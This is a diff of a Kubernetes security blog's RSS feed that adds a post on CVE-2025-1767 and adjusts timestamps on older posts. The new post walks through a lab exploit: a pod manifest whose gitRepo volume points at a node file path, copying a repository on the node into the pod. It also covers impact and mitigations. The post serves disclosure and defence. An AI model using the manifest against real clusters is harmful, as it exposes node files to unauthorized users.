@@ -7,6 +7,85 @@
 		<atom:link href="https://raesene.github.io/feed.xml" rel="self" type="application/rss+xml" />
 		
 			<item>
+				<title>CVE-2025-1767 - Another gitrepo issue</title>
+				<description>&lt;p&gt;There’s a new Kubernetes security vulnerability that’s just been disclosed and I thought it was worth taking a look at it, as there’s a couple of interesting aspects to it. &lt;a href=&quot;https://github.com/kubernetes/kubernetes/issues/130786&quot;&gt;CVE-2025-1767&lt;/a&gt; exists in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gitRepo&lt;/code&gt; volume type and can allow users who can create pods with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gitRepo&lt;/code&gt; volumes to get access to any other git repository on the node where the pod is deployed. This is the second recent CVE related to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gitRepo&lt;/code&gt; volumes, I covered the last one &lt;a href=&quot;https://raesene.github.io/blog/2024/07/10/Fun-With-GitRepo-Volumes/&quot;&gt;here&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;vulnerability-and-exploitation&quot;&gt;Vulnerability and Exploitation&lt;/h2&gt;
+
+&lt;p&gt;So setting this up is relatively straightforward. Our node OS has to have &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git&lt;/code&gt; installed, which is common but not the case in every distribution, and we need to be able to create pods on that node. With those two pre-requisites in place, we can show how to exploit it.&lt;/p&gt;
+
+&lt;p&gt;I’m going to use a &lt;a href=&quot;https://kind.sigs.k8s.io/&quot;&gt;kind cluster&lt;/a&gt; , so first step is to shell into the cluster and install git, as it’s not included with kind.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kind create cluster
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;docker exec -it kind-control-plane bash
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;apt update &amp;amp;&amp;amp; apt install -y git
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Next we need a “victim” git repository, for this I’ll just clone down &lt;a href=&quot;https://github.com/raesene/TestingScripts/&quot;&gt;one of my repositories&lt;/a&gt; into the root of the node’s filesystem.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git clone https://github.com/raesene/TestingScripts/
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;With that setup done, exit the node shell, and then we can create our “exploit” pod. This is pretty straightforward, all we need is a pod with a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gitRepo&lt;/code&gt; volume and we specify the repository to pull into the pod using a file path. As the plugin is just running git on the host, it can access that directory just fine and pull it into the pod.&lt;/p&gt;
+
+&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;na&quot;&gt;apiVersion&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;v1&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Pod&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;metadata&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;git-repo-pod-test&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;spec&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;containers&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+  &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;git-repo-test-container&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;image&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;raesene/alpine-containertools&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;volumeMounts&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;git-volume&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;mountPath&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;/tmp&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;volumes&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+  &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;git-volume&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;gitRepo&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;repository&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;/TestingScripts&quot;&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;directory&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;.&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We can then save this as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gitrepotest.yaml&lt;/code&gt; and apply it to the cluster with&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kubectl create -f gitrepotest.yaml
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;If all works ok, it should be possible to check that the repository has been cloned from the node into the pod&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kubectl exec git-repo-pod-test -- ls /tmp
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;This will show the files from the cloned repository!&lt;/p&gt;
+
+&lt;h2 id=&quot;impact--exploitability&quot;&gt;Impact &amp;amp; Exploitability&lt;/h2&gt;
+
+&lt;p&gt;So that’s how it works, is it really a problem? My feeling is that this is quite a situational vulnerability. Essentially the attacker needs to know the path to a git repository on the node, and for it to contain files that they should not have access to. That’s not going to be be every cluster for sure, but there are times when you could see this causing problems&lt;/p&gt;
+
+&lt;h2 id=&quot;patching--mitigation&quot;&gt;Patching &amp;amp; Mitigation&lt;/h2&gt;
+
+&lt;p&gt;The patching situation for this vulnerability is interesting. The CVE description says that a patch will not be provided as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gitRepo&lt;/code&gt; volumes are deprecated, which is true. However, this volume type is enabled by Kubernetes by default and there is no flag or switch that would allow a cluster operator to disable it.&lt;/p&gt;
+
+&lt;p&gt;There has been an &lt;a href=&quot;https://github.com/kubernetes/kubernetes/issues/125983&quot;&gt;ongoing discussion&lt;/a&gt; on disabling and/or removing this volume type since the &lt;a href=&quot;https://github.com/kubernetes/kubernetes/issues/128885&quot;&gt;last CVE&lt;/a&gt; affecting this component, but a decision hasn’t currently been made on its removal.&lt;/p&gt;
+
+&lt;p&gt;In practice, if you don’t use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gitRepo&lt;/code&gt; volumes, you can mitigate this in a couple of ways. If you don’t need &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git&lt;/code&gt; on your nodes you can just remove it there (assuming un-managed Kubernetes of course), and you can also block the use of these volumes using &lt;a href=&quot;https://kubernetes.io/docs/reference/access-authn-authz/validating-admission-policy/&quot;&gt;Validating Admission Policy&lt;/a&gt; or similar admission controllers. There’s some details in the CVE announcement of a policy that could be used.&lt;/p&gt;
+
+&lt;p&gt;One downside that you may encounter here is that I’d imagine that CVE scanners will pick up this vulnerability and as they can’t easily detect the mitigations, and as there are no patches available and all Kubernetes versions are affected, I’d expect this to flag a lot of Kubernetes installations as vulnerable.&lt;/p&gt;
+
+&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;
+
+&lt;p&gt;Whilst this is a bit of a situational vulnerability, it’s an interesting illustration of how some less well known components of Kubernetes can affect its security.&lt;/p&gt;
+</description>
+				<pubDate>Fri, 14 Mar 2025 11:00:00 +0100</pubDate>
+				<link>https://raesene.github.io/blog/2025/03/14/cve-2025-1767-another-gitrepo-issue/</link>
+				<guid isPermaLink="true">https://raesene.github.io/blog/2025/03/14/cve-2025-1767-another-gitrepo-issue/</guid>
+			</item>
+		
+			<item>
 				<title>Exploring the Kubernetes API Server Proxy</title>
 				<description>&lt;p&gt;For my first post of the year I thought it’d be interesting to look at a lesser known feature of the Kubernetes API server which has some interesting security implications.&lt;/p&gt;
 
@@ -208,7 +287,7 @@ Request Headers:
 
 &lt;p&gt;If you’re a cluster operator it’s important to be very careful with who you provide proxy rights to, and if you’re considering creating a managed Kubernetes service where you don’t want cluster owners to have access to the control plane, you’re going to need to be very careful with network firewalling and ensuring that the proxy doesn’t let them get to areas that should be restricted!&lt;/p&gt;
 </description>
-				<pubDate>Sat, 18 Jan 2025 10:00:00 +0000</pubDate>
+				<pubDate>Sat, 18 Jan 2025 11:00:00 +0100</pubDate>
 				<link>https://raesene.github.io/blog/2025/01/18/Exploring-the-Kubernetes-API-Server-Proxy/</link>
 				<guid isPermaLink="true">https://raesene.github.io/blog/2025/01/18/Exploring-the-Kubernetes-API-Server-Proxy/</guid>
 			</item>
@@ -256,7 +335,7 @@ exit
 
 &lt;p&gt;Kubernetes RBAC has some tricky areas where the behaviour you get might not be exactly what you expect, and sometimes as in this case, those unexpected behaviours are not very apparent!&lt;/p&gt;
 </description>
-				<pubDate>Mon, 11 Nov 2024 12:00:00 +0000</pubDate>
+				<pubDate>Mon, 11 Nov 2024 13:00:00 +0100</pubDate>
 				<link>https://raesene.github.io/blog/2024/11/11/When-Is-Read-Only-Not-Read-Only/</link>
 				<guid isPermaLink="true">https://raesene.github.io/blog/2024/11/11/When-Is-Read-Only-Not-Read-Only/</guid>
 			</item>
@@ -343,7 +422,7 @@ exit
 
 &lt;p&gt;This was a quick look at a very simple CNI implementation, and how it all works will vary depending on the network plugin(s) you use. If you’re looking for a more in-depth treatment of what we’ve discussed here, I’d recommend &lt;a href=&quot;https://www.tkng.io/&quot;&gt;The Kubernetes Networking Guide&lt;/a&gt; which has a lot of information on this topic and others.&lt;/p&gt;
 </description>
-				<pubDate>Thu, 07 Nov 2024 12:00:00 +0000</pubDate>
+				<pubDate>Thu, 07 Nov 2024 13:00:00 +0100</pubDate>
 				<link>https://raesene.github.io/blog/2024/11/07/Exploring-a-basic-Kubernetes-Network-Plugin/</link>
 				<guid isPermaLink="true">https://raesene.github.io/blog/2024/11/07/Exploring-a-basic-Kubernetes-Network-Plugin/</guid>
 			</item>
@@ -411,7 +490,7 @@ num   pkts bytes target     prot opt in     out     source               destina
 &lt;p&gt;The goal of this post was just to explore a couple of concepts. Firstly, the variety of IP addresses you’re likely to see in a Kubernetes cluster and then how those tie to the operating system level.&lt;/p&gt;
 
 </description>
-				<pubDate>Fri, 01 Nov 2024 08:00:00 +0000</pubDate>
+				<pubDate>Fri, 01 Nov 2024 09:00:00 +0100</pubDate>
 				<link>https://raesene.github.io/blog/2024/11/01/The-Many-IP-Addresses-Of-Kubernetes/</link>
 				<guid isPermaLink="true">https://raesene.github.io/blog/2024/11/01/The-Many-IP-Addresses-Of-Kubernetes/</guid>
 			</item>
@@ -484,7 +563,7 @@ ctr -n sys_net_mon run --net-host -d --mount type=bind,src=/,dst=/host,options=r
 
 &lt;p&gt;This is an interesting issue, as it’s not been assigned a CVE but, as you can see, could lead to breakout from a container to the underlying node. The goal of this blog has been to demonstrate one possible impact from that and to raise some awareness of why you probably want to fix it, if your threat model includes having users who you want to create pods, but not necessarily give root access to your cluster nodes to!&lt;/p&gt;
 </description>
-				<pubDate>Wed, 10 Jul 2024 18:27:00 +0100</pubDate>
+				<pubDate>Wed, 10 Jul 2024 19:27:00 +0200</pubDate>
 				<link>https://raesene.github.io/blog/2024/07/10/Fun-With-GitRepo-Volumes/</link>
 				<guid isPermaLink="true">https://raesene.github.io/blog/2024/07/10/Fun-With-GitRepo-Volumes/</guid>
 			</item>
@@ -542,7 +621,7 @@ ctr -n sys_net_mon run --net-host -d --mount type=bind,src=/,dst=/host,options=r
 
 &lt;p&gt;Kubernetes profiling is another interesting part of the API which can be relevant for security. For production clusters, it’s an unusual choice to have it enabled by default, and probably something that should just be disabled, unless you explicitly need it.&lt;/p&gt;
 </description>
-				<pubDate>Tue, 18 Jun 2024 12:27:00 +0100</pubDate>
+				<pubDate>Tue, 18 Jun 2024 13:27:00 +0200</pubDate>
 				<link>https://raesene.github.io/blog/2024/06/18/Taking-A-Look-At-Kubernetes-Profiling/</link>
 				<guid isPermaLink="true">https://raesene.github.io/blog/2024/06/18/Taking-A-Look-At-Kubernetes-Profiling/</guid>
 			</item>
@@ -673,7 +752,7 @@ kubernetes_feature_enabled{name=&quot;CPUManagerPolicyAlphaOptions&quot;,stage=&
 
 &lt;p&gt;This was just a quick note with a look at the kube-proxy API. Of the APIs that Kubernetes presents, it’s probably not the most interesting from a security perspective, but still has some interesting information disclosure and the choice to not provide authentication does make it an interesting target for reconnaissance.&lt;/p&gt;
 </description>
-				<pubDate>Sun, 16 Jun 2024 12:27:00 +0100</pubDate>
+				<pubDate>Sun, 16 Jun 2024 13:27:00 +0200</pubDate>
 				<link>https://raesene.github.io/blog/2024/06/16/Taking-A-Look-At-The-Kube-Proxy-API/</link>
 				<guid isPermaLink="true">https://raesene.github.io/blog/2024/06/16/Taking-A-Look-At-The-Kube-Proxy-API/</guid>
 			</item>
@@ -759,7 +838,7 @@ jane:list:pods:default
 &lt;p&gt;It’s fair to say that the flexibility provided in Kubernetes security model does lead to some complexity, which you need to be aware of when operating or reviewing clusters. In this case it’s important to be aware of the limitations of in-built tooling and realise when it’s necessary to carry out additional manual reviews.&lt;/p&gt;
 
 </description>
-				<pubDate>Mon, 22 Apr 2024 11:27:00 +0100</pubDate>
+				<pubDate>Mon, 22 Apr 2024 12:27:00 +0200</pubDate>
 				<link>https://raesene.github.io/blog/2024/04/22/Fun-with-Kubernetes-Authz/</link>
 				<guid isPermaLink="true">https://raesene.github.io/blog/2024/04/22/Fun-with-Kubernetes-Authz/</guid>
 			</item>
@@ -862,40 +941,9 @@ jane:list:pods:default
 
 &lt;p&gt;This was just a quick walkthrough of using Tailscale for creating a little “botnet”. Whilst there are many tools to do this with, it’s always interesting to explore other options!&lt;/p&gt;
 </description>
-				<pubDate>Sun, 24 Mar 2024 07:27:00 +0000</pubDate>
+				<pubDate>Sun, 24 Mar 2024 08:27:00 +0100</pubDate>
 				<link>https://raesene.github.io/blog/2024/03/24/Using-Tailscale-for-persistence/</link>
 				<guid isPermaLink="true">https://raesene.github.io/blog/2024/03/24/Using-Tailscale-for-persistence/</guid>
-			</item>
-		
-			<item>
-				<title>A final Kubernetes census</title>
-				<description>&lt;p&gt;Well, all good things must come to an end. Over the last couple of years I’ve been using the &lt;a href=&quot;https://censys.io&quot;&gt;Censys&lt;/a&gt; API to track the number of Kubernetes clusters exposed to the internet which disclose their version number, and I’ve written about it a couple of times &lt;a href=&quot;https://raesene.github.io/blog/2021/06/05/A-Census-of-Kubernetes-Clusters/&quot;&gt;here&lt;/a&gt; and &lt;a href=&quot;https://raesene.github.io/blog/2022/07/03/lets-talk-about-kubernetes-on-the-internet/&quot;&gt;here&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;After a couple of failures of the daily script to run, I logged into my Censys account to see a banner saying that free access to their API had been removed.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raesene.github.io/assets/media/censys-no-free-api.png&quot; alt=&quot;No free Censys&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Looking at the plans available they were a bit pricey for this hobby project, so I’ve decided to stop the daily script and this will be the last post on the topic.&lt;/p&gt;
-
-&lt;h2 id=&quot;kubernetes-numbers&quot;&gt;Kubernetes numbers&lt;/h2&gt;
-
-&lt;p&gt;So what’s the final outcome? Well the last scan shows 1,626,249 cluster hosts with visible version numbers on the Internet (and it’s worth noting the final number will be higher as some distributions like AKS don’t expose version number without authentication). Compared to 842,350 hosts in August 2022 when this dataset started, that’s a pretty significant increase (I’ve got data from earlier than that in the posts above but Censys changed their scanning methodology in August 2022, so it’s not directly comparable).&lt;/p&gt;
-
-&lt;p&gt;In terms of visible versions, the most common major version is v1.26, which is reasonably up to date, but still quite a way back from the latest released version (v1.29). There is a “long tail” quite visibly present, so it’s obvious that some cluster operators are finding the update cycyle challenging.&lt;/p&gt;
-
-&lt;p&gt;Looking at a graph of all the versions we can see the different versions and how they’ve changed over time.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raesene.github.io/assets/media/kubernetes-versions-2024.png&quot; alt=&quot;K8s versions&quot; /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;
-
-&lt;p&gt;This has been a pretty interesting project for providing some insights into how Kubernetes adoption runs over time and what versions of Kubernetes are actually in use. It’s amusing that it was enabled by a quirk of Kubernetes default configuration (exposing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/version&lt;/code&gt; without authentication) and defaults from the major managed Kubernetes distributions (which put the API server on the Internet by default).&lt;/p&gt;
-
-&lt;p&gt;The data is available at &lt;a href=&quot;https://github.com/raesene/public-k8s-censys&quot;&gt;this repo&lt;/a&gt; along with some details of how it was analysed, so that might well be useful for someone else :)&lt;/p&gt;
-</description>
-				<pubDate>Sat, 17 Feb 2024 14:27:00 +0000</pubDate>
-				<link>https://raesene.github.io/blog/2024/02/17/a-final-kubernetes-censys/</link>
-				<guid isPermaLink="true">https://raesene.github.io/blog/2024/02/17/a-final-kubernetes-censys/</guid>
 			</item>
 		
 	</channel>
